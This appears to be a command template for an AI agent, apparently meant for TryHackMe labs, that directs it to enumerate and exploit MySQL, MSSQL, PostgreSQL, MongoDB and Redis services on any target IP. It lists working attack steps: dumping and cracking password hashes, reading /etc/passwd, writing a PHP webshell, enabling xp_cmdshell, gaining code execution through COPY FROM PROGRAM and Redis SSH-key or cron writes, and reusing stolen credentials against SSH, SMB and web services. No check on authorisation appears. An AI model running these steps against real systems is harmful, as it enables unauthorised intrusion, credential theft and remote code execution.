---
description: Enumerate and exploit a database service (MySQL/MSSQL/Postgres/Mongo/Redis)
---

Enumerate the database at: $ARGUMENTS
Expected: <target-IP> <type> [user:pass]  (type = mysql|mssql|postgres|mongo|redis)

Connect, enumerate, and look for the two prizes: credentials to reuse, and command
execution. Save findings to notes.md. Try discovered creds elsewhere on the box.

## MySQL / MariaDB (3306)
- `mysql -h <IP> -u <user> -p<pass>`  (or try root with blank/weak pass)
- Enum: `SHOW DATABASES; SELECT user,authentication_string FROM mysql.user;`
- File read/write (if FILE priv): `SELECT LOAD_FILE('/etc/passwd');`
  `... INTO OUTFILE '/var/www/html/sh.php'` for a webshell
- Crack any dumped password hashes with hashcat

## MSSQL (1433)
- `impacket-mssqlclient <user>:<pass>@<IP> -windows-auth`
- Command exec: `enable_xp_cmdshell` then `xp_cmdshell 'whoami'`
- Or `nxc mssql <IP> -u <user> -p <pass> -x 'whoami'`
- Try impersonation (`EXECUTE AS`) and linked servers for privesc

## PostgreSQL (5432)
- `psql -h <IP> -U <user>`  then `\l`, `\du`, `\dt`
- RCE via `COPY ... FROM PROGRAM 'id'` (needs superuser) or large-object file write

## MongoDB (27017)
- `mongosh --host <IP>` (often no auth) → `show dbs; use <db>; db.<coll>.find()`
- Look for stored app credentials / user tables

## Redis (6379)
- `redis-cli -h <IP>` → `INFO`, `CONFIG GET dir`, `KEYS *`
- Unauth Redis RCE: write an SSH key or cron job via `CONFIG SET dir` + `SET`/`SAVE`

## Summarize
Report: creds found | data of interest | RCE achieved (yes/no + method). If you got
command exec, move to getting a proper shell (/listener or /win-shell). Reuse any DB
creds against SSH/SMB/web — password reuse is extremely common on THM.
